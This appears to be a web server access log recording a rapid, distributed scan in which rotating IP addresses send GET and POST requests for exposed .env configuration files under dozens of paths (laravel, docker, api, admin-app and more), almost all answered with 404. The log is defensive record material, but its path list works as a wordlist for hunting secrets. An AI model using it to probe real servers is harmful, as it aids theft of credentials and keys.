+2024-01-24 21:06:03 172.31.36.65 GET /.env.production - 80 - 63.135.161.117 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:03 172.31.36.65 POST /.env.production - 80 - 173.239.211.37 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:03 172.31.36.65 GET /.env.prod - 443 - 63.135.161.120 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:03 172.31.36.65 GET /.env.development+ - 80 - 63.135.161.114 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:03 172.31.36.65 POST /.env.prod - 443 - 173.239.211.44 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:03 172.31.36.65 POST /.env.development+ - 80 - 45.130.83.248 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:04 172.31.36.65 GET /laravel/.env+ - 80 - 45.130.83.251 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:04 172.31.36.65 POST /laravel/.env+ - 80 - 45.130.83.240 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/107.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:04 172.31.36.65 GET /.env.production - 443 - 173.239.211.37 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 62
+2024-01-24 21:06:04 172.31.36.65 GET /admin-app/.env+ - 80 - 173.239.211.52 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:04 172.31.36.65 POST /.env.production - 443 - 173.239.211.41 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 54
+2024-01-24 21:06:04 172.31.36.65 POST /admin-app/.env+ - 80 - 63.135.161.118 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.0+Safari/605.1.15 - 404 0 2 16
+2024-01-24 21:06:05 172.31.36.65 GET /.env.development+ - 443 - 63.135.161.111 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:05 172.31.36.65 GET /api/.env - 80 - 63.135.161.113 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:05 172.31.36.65 POST /api/.env - 80 - 45.130.83.238 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:05 172.31.36.65 POST /.env.development+ - 443 - 63.135.161.112 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.0+Safari/605.1.15 - 404 0 2 44
+2024-01-24 21:06:05 172.31.36.65 GET /app/.env+ - 80 - 45.130.83.242 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:06 172.31.36.65 GET /laravel/.env+ - 443 - 45.130.83.242 Mozilla/5.0+(X11;+Linux+x86_64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 59
+2024-01-24 21:06:06 172.31.36.65 POST /laravel/.env+ - 443 - 45.130.83.250 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:06 172.31.36.65 POST /app/.env+ - 80 - 173.239.211.35 Mozilla/5.0+(X11;+Linux+x86_64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:06:06 172.31.36.65 GET /admin-app/.env+ - 443 - 45.130.83.250 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 63
+2024-01-24 21:06:08 172.31.36.65 GET /development/.env+ - 80 - 45.130.83.246 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 17
+2024-01-24 21:06:08 172.31.36.65 POST /admin-app/.env+ - 443 - 63.135.161.117 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:08 172.31.36.65 POST /development/.env+ - 80 - 173.239.211.43 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 15
+2024-01-24 21:06:08 172.31.36.65 GET /apps/.env+ - 80 - 173.239.211.51 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/16.0+Safari/605.1.15 - 404 0 2 17
+2024-01-24 21:06:08 172.31.36.65 GET /api/.env - 443 - 63.135.161.119 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 59
+2024-01-24 21:06:08 172.31.36.65 POST /api/.env - 443 - 173.239.211.52 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 59
+2024-01-24 21:06:09 172.31.36.65 GET /app/.env+ - 443 - 173.239.211.53 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 55
+2024-01-24 21:06:09 172.31.36.65 POST /app/.env+ - 443 - 45.130.83.239 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 53
+2024-01-24 21:06:10 172.31.36.65 GET /development/.env+ - 443 - 63.135.161.119 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:06:10 172.31.36.65 POST /development/.env+ - 443 - 173.239.211.35 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 63
+2024-01-24 21:06:10 172.31.36.65 GET /apps/.env+ - 443 - 173.239.211.49 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:06:12 172.31.36.65 POST /apps/.env+ - 443 - 63.135.161.110 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 40
+2024-01-24 21:06:12 172.31.36.65 GET /cp/.env - 443 - 173.239.211.51 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:13 172.31.36.65 POST /cp/.env - 443 - 45.130.83.241 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 28
+2024-01-24 21:06:13 172.31.36.65 GET /private/.env - 443 - 63.135.161.122 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 44
+2024-01-24 21:06:13 172.31.36.65 GET /cp/.env - 80 - 63.135.161.116 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:06:14 172.31.36.65 POST /private/.env - 443 - 63.135.161.129 Mozilla/5.0+(Windows+NT+10.0;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 60
+2024-01-24 21:06:14 172.31.36.65 POST /cp/.env - 80 - 63.135.161.118 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 15
+2024-01-24 21:06:14 172.31.36.65 GET /private/.env - 80 - 45.130.83.242 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10.15;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:14 172.31.36.65 POST /private/.env - 80 - 173.239.211.51 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:14 172.31.36.65 GET /system/.env - 443 - 63.135.161.121 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:14 172.31.36.65 GET /system/.env - 80 - 45.130.83.240 Mozilla/5.0+(X11;+Linux+x86_64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:06:15 172.31.36.65 POST /system/.env - 80 - 191.101.41.157 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:15 172.31.36.65 GET /redmine/.env - 80 - 45.130.83.251 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:15 172.31.36.65 POST /redmine/.env - 80 - 45.130.83.241 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:15 172.31.36.65 GET /docker/.env - 80 - 45.130.83.243 Mozilla/5.0+(X11;+Linux+x86_64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 15
+2024-01-24 21:06:15 172.31.36.65 POST /docker/.env - 80 - 173.239.211.41 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 17
+2024-01-24 21:06:15 172.31.36.65 POST /system/.env - 443 - 191.101.41.158 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:15 172.31.36.65 GET /cms/.env - 80 - 45.130.83.248 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:16 172.31.36.65 POST /cms/.env - 80 - 173.239.211.36 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:16 172.31.36.65 GET /redmine/.env - 443 - 63.135.161.115 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:16 172.31.36.65 GET /script/.env - 80 - 45.130.83.239 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:16 172.31.36.65 POST /redmine/.env - 443 - 173.239.211.35 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 62
+2024-01-24 21:06:16 172.31.36.65 POST /script/.env - 80 - 45.130.83.250 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 15
+2024-01-24 21:06:18 172.31.36.65 GET /live_env+ - 80 - 63.135.161.116 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:18 172.31.36.65 GET /docker/.env - 443 - 63.135.161.123 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:18 172.31.36.65 POST /live_env+ - 80 - 173.239.211.55 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:18 172.31.36.65 POST /docker/.env - 443 - 173.239.211.47 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 34
+2024-01-24 21:06:18 172.31.36.65 GET /application/.env - 80 - 173.239.211.49 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:18 172.31.36.65 GET /cms/.env - 443 - 173.239.211.47 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 18
+2024-01-24 21:06:19 172.31.36.65 POST /application/.env - 80 - 173.239.211.44 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/107.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:19 172.31.36.65 POST /cms/.env - 443 - 45.130.83.243 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:19 172.31.36.65 GET /.env.project+ - 80 - 63.135.161.115 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:19 172.31.36.65 POST /.env.project+ - 80 - 173.239.211.45 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:19 172.31.36.65 GET /script/.env - 443 - 173.239.211.39 Mozilla/5.0+(Windows+NT+10.0;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:19 172.31.36.65 GET /.env.dist - 80 - 45.130.83.246 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:20 172.31.36.65 POST /.env.dist - 80 - 63.135.161.114 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 17
+2024-01-24 21:06:20 172.31.36.65 POST /script/.env - 443 - 63.135.161.115 Mozilla/5.0+(X11;+Ubuntu;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 59
+2024-01-24 21:06:20 172.31.36.65 GET /back/.env - 80 - 63.135.161.129 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:06:20 172.31.36.65 POST /back/.env - 80 - 45.130.83.240 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:20 172.31.36.65 GET /live_env+ - 443 - 63.135.161.123 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:06:20 172.31.36.65 GET /core/.env - 80 - 173.239.211.39 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:20 172.31.36.65 POST /live_env+ - 443 - 173.239.211.38 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 46
+2024-01-24 21:06:21 172.31.36.65 POST /core/.env - 80 - 45.130.83.250 Mozilla/5.0+(X11;+Linux+x86_64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:21 172.31.36.65 GET /application/.env - 443 - 63.135.161.114 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 32
+2024-01-24 21:06:21 172.31.36.65 GET /docker/.env - 80 - 45.130.83.241 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 17
+2024-01-24 21:06:21 172.31.36.65 POST /application/.env - 443 - 63.135.161.116 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:23 172.31.36.65 GET /.env.project+ - 443 - 63.135.161.122 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:23 172.31.36.65 POST /.env.project+ - 443 - 63.135.161.120 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 56
+2024-01-24 21:06:23 172.31.36.65 GET /.env.dist - 443 - 173.239.211.51 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:26 172.31.36.65 POST /.env.dist - 443 - 45.130.83.243 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:06:28 172.31.36.65 GET /fedex/.env - 80 - 191.101.41.157 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:28 172.31.36.65 GET /back/.env - 443 - 63.135.161.110 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:28 172.31.36.65 POST /fedex/.env - 80 - 173.239.211.51 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 17
+2024-01-24 21:06:28 172.31.36.65 GET /__tests__/test-become/.env - 80 - 173.239.211.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:28 172.31.36.65 POST /__tests__/test-become/.env - 80 - 45.130.83.239 Mozilla/5.0+(Windows+NT+10.0;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:29 172.31.36.65 GET /local/.env - 80 - 63.135.161.114 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:29 172.31.36.65 POST /back/.env - 443 - 63.135.161.120 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 59
+2024-01-24 21:06:29 172.31.36.65 POST /local/.env - 80 - 191.101.41.158 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:29 172.31.36.65 GET /rest/.env - 80 - 173.239.211.46 Mozilla/5.0+(X11;+Linux+x86_64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:06:29 172.31.36.65 GET /core/.env - 443 - 173.239.211.43 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 63
+2024-01-24 21:06:30 172.31.36.65 POST /rest/.env - 80 - 45.130.83.251 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 16
+2024-01-24 21:06:30 172.31.36.65 POST /core/.env - 443 - 173.239.211.43 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 48
+2024-01-24 21:06:30 172.31.36.65 GET /shared/.env+ - 80 - 45.130.83.240 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:30 172.31.36.65 POST /shared/.env+ - 80 - 173.239.211.45 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:30 172.31.36.65 GET /docker/.env - 443 - 45.130.83.239 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 55
+2024-01-24 21:06:30 172.31.36.65 GET /sources/.env - 80 - 45.130.83.249 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:31 172.31.36.65 POST /sources/.env - 80 - 63.135.161.112 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:31 172.31.36.65 POST /docker/.env - 443 - 173.239.211.38 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 15
+2024-01-24 21:06:31 172.31.36.65 GET /enviroments/.env.production - 80 - 173.239.211.38 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:31 172.31.36.65 POST /enviroments/.env.production - 80 - 173.239.211.38 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/107.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:31 172.31.36.65 GET /enviroments/.env - 80 - 45.130.83.239 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:31 172.31.36.65 GET /fedex/.env - 443 - 173.239.211.42 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 32
+2024-01-24 21:06:31 172.31.36.65 POST /enviroments/.env - 80 - 173.239.211.55 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
+2024-01-24 21:06:31 172.31.36.65 GET / - 80 - 45.130.83.251 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 200 0 0 17
+2024-01-24 21:06:31 172.31.36.65 POST /fedex/.env - 443 - 45.130.83.240 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 15
+2024-01-24 21:06:33 172.31.36.65 POST / - 80 - 45.130.83.248 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 405 0 1 17
+2024-01-24 21:06:33 172.31.36.65 GET /__tests__/test-become/.env - 443 - 173.239.211.55 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 59
+2024-01-24 21:06:33 172.31.36.65 POST /__tests__/test-become/.env - 443 - 173.239.211.50 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 16
+2024-01-24 21:06:33 172.31.36.65 GET /local/.env - 443 - 45.130.83.244 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 59
+2024-01-24 21:06:34 172.31.36.65 POST /local/.env - 443 - 173.239.211.47 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_15_7)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 35
+2024-01-24 21:06:34 172.31.36.65 GET /rest/.env - 443 - 63.135.161.120 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 59
+2024-01-24 21:06:34 172.31.36.65 POST /rest/.env - 443 - 45.130.83.241 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 59
+2024-01-24 21:06:35 172.31.36.65 GET /shared/.env+ - 443 - 173.239.211.41 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 27
+2024-01-24 21:06:37 172.31.36.65 POST /shared/.env+ - 443 - 173.239.211.44 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 59
+2024-01-24 21:06:37 172.31.36.65 GET /sources/.env - 443 - 45.130.83.248 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 44
+2024-01-24 21:06:37 172.31.36.65 POST /sources/.env - 443 - 63.135.161.111 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:106.0)+Gecko/20100101+Firefox/106.0 - 404 0 2 15
+2024-01-24 21:06:38 172.31.36.65 GET /enviroments/.env.production - 443 - 173.239.211.40 Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/106.0.0.0+Safari/537.36 - 404 0 2 59
+2024-01-24 21:06:38 172.31.36.65 POST /enviroments/.env.production - 443 - 173.239.211.35 Mozilla/5.0+(Windows+NT+10.0;+rv:105.0)+Gecko/20100101+Firefox/105.0 - 404 0 2 16
